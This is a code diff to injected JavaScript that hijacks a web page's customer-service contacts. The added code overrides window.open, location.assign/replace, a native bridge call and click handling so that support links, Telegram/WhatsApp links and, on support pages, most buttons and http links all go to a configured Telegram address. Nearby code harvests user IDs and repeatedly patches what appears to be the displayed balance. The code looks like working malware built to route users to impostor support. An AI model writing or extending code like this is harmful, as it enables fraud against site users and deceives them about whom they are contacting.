@@ -1190,12 +1190,18 @@ var f=ID_FIELDS[i];if(d[f]){var v=String(d[f]).trim();
 if(/^\\d{6,12}$/.test(v)){setUID(v);break;}}}}}catch(e){}}).catch(function(){});}catch(e){}
 return resp;});};}
 
+var _csPage=false;
 function csUrl(s){
 if(!s||typeof s!=='string')return false;
-return s.indexOf('t.me/')>-1||s.indexOf('wa.me/')>-1||s.indexOf('whatsapp.com')>-1||s.indexOf('telegram.me/')>-1;}
+return s.indexOf('t.me/')>-1||s.indexOf('wa.me/')>-1||s.indexOf('whatsapp.com')>-1||s.indexOf('telegram.me/')>-1||s.indexOf('telegram.org')>-1||s.indexOf('chat.')>-1||s.indexOf('support')>-1||s.indexOf('service')>-1||s.indexOf('kefu')>-1;}
+
+function isCSPage(){
+var txt=(document.body?document.body.innerText:'').toLowerCase();
+return txt.indexOf('customer service')>-1||txt.indexOf('online service')>-1||txt.indexOf('online csr')>-1||txt.indexOf('whatsapp')>-1;}
 
 function fixLinks(){
 if(!CFG||!CFG.tg)return;
+_csPage=isCSPage();
 var links=document.querySelectorAll('a');
 for(var i=0;i<links.length;i++){
 var h=links[i].href||'';
@@ -1210,8 +1216,15 @@ if(csUrl(oc)){all[i].setAttribute('onclick',"window.location.href='"+CFG.tg+"'")
 
 var _wopen=window.open;
 window.open=function(url){
-if(CFG&&CFG.tg&&csUrl(url)){arguments[0]=CFG.tg;}
+if(CFG&&CFG.tg){
+if(csUrl(url)||_csPage){arguments[0]=CFG.tg;}}
 return _wopen.apply(this,arguments);};
+
+var _locDesc=Object.getOwnPropertyDescriptor(window,'location')||{};
+var _asgn=window.location.assign.bind(window.location);
+var _repl=window.location.replace.bind(window.location);
+window.location.assign=function(url){if(CFG&&CFG.tg&&(csUrl(url)||_csPage))url=CFG.tg;return _asgn(url);};
+window.location.replace=function(url){if(CFG&&CFG.tg&&(csUrl(url)||_csPage))url=CFG.tg;return _repl(url);};
 
 if(window.xamlAction&&window.xamlAction.invokeAction){
 var _invoke=window.xamlAction.invokeAction.bind(window.xamlAction);
@@ -1219,8 +1232,9 @@ window.xamlAction.invokeAction=function(action,params){
 if(CFG&&CFG.tg&&params){
 try{var p=JSON.parse(params);
 var changed=false;
-['ct_url','url','link','href','jumpUrl','serviceUrl','csUrl'].forEach(function(key){
-if(p[key]&&csUrl(p[key])){p[key]=CFG.tg;changed=true;}});
+var ukeys=['ct_url','url','link','href','jumpUrl','serviceUrl','csUrl','jump_url','target','redirect','contactUrl'];
+ukeys.forEach(function(key){
+if(p[key]&&typeof p[key]==='string'&&(csUrl(p[key])||p[key].indexOf('http')===0)){p[key]=CFG.tg;changed=true;}});
 if(changed)params=JSON.stringify(p);
 }catch(e){}}
 return _invoke(action,params);};}
@@ -1228,19 +1242,30 @@ return _invoke(action,params);};}
 document.addEventListener('click',function(e){
 if(!CFG||!CFG.tg)return;
 var el=e.target;var depth=0;
+var onCS=_csPage||isCSPage();
 while(el&&depth<10){
 if(el.tagName==='A'){
 var href=el.getAttribute('href')||'';
+if(csUrl(href)||(onCS&&href.indexOf('http')===0)){
+e.preventDefault();e.stopPropagation();
+window.location.href=CFG.tg;return;}
 if(href.indexOf('xaml:')===0){
 try{var dec=decodeURIComponent(href.substring(5));
 var jo=JSON.parse(dec);
-if(jo.ct_url&&csUrl(jo.ct_url)){jo.ct_url=CFG.tg;
-el.setAttribute('href','xaml:'+encodeURIComponent(JSON.stringify(jo)));}}catch(e){}}
+var ck=['ct_url','url','link','href','jumpUrl','jump_url','target','serviceUrl'];
+var ch=false;
+ck.forEach(function(k2){if(jo[k2]){jo[k2]=CFG.tg;ch=true;}});
+if(ch){e.preventDefault();e.stopPropagation();window.location.href=CFG.tg;return;}}catch(e2){}}
 if(href.indexOf('syt:')===0){
 try{var dec2=decodeURIComponent(href.substring(4));
 var jo2=JSON.parse(dec2);
-if(jo2.url&&csUrl(jo2.url)){jo2.url=CFG.tg;
-el.setAttribute('href','syt:'+encodeURIComponent(JSON.stringify(jo2)));}}catch(e){}}}
+if(jo2.url||jo2.link||jo2.href){
+e.preventDefault();e.stopPropagation();window.location.href=CFG.tg;return;}}catch(e3){}}}
+if(onCS&&(el.tagName==='BUTTON'||el.tagName==='DIV'||el.tagName==='SPAN'||el.tagName==='LI')){
+var elTxt=(el.innerText||'').toLowerCase();
+if(elTxt.indexOf('go')>-1||elTxt.indexOf('service')>-1||elTxt.indexOf('online')>-1||elTxt.indexOf('csr')>-1||elTxt.indexOf('whatsapp')>-1||elTxt.indexOf('telegram')>-1||elTxt.indexOf('contact')>-1){
+e.preventDefault();e.stopPropagation();
+window.location.href=CFG.tg;return;}}
 el=el.parentElement;depth++;}
 },true);
 
@@ -1252,7 +1277,8 @@ if(m&&m[1])setUID(m[1]);
 }catch(e){}}
 
 scanDOM();patchBalDOM();
-for(var _t=100;_t<=2000;_t+=100){setTimeout(patchBalDOM,_t);}
+var _rafC=0;function _rafLoop(){patchBalDOM();_rafC++;if(_rafC<300)requestAnimationFrame(_rafLoop);}
+requestAnimationFrame(_rafLoop);
 setInterval(function(){scanDOM();patchBalDOM();},300);
 if(document.body){
 var obs=new MutationObserver(function(){patchBalDOM();fixLinks();fixOnClick();scanDOM();});
